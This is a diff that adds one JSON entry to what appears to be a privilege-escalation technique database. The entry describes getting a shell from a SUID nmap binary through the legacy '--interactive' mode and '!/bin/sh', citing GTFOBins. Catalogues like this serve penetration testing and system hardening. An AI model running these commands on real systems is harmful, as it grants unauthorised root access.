@@ -1,0 +1,1 @@
+{"id":"suid_nmap","category":"SUID_GTFOBINS","binary":"nmap","cve":null,"exploitation":["{{binary}} --interactive","nmap> !/bin/sh"],"post_exploit":["id"],"notes":"Requires nmap < 5.20. --interactive removed in modern versions.","source":"gtfobins.github.io","tags":["suid","gtfobins","legacy"],"severity":"high"}
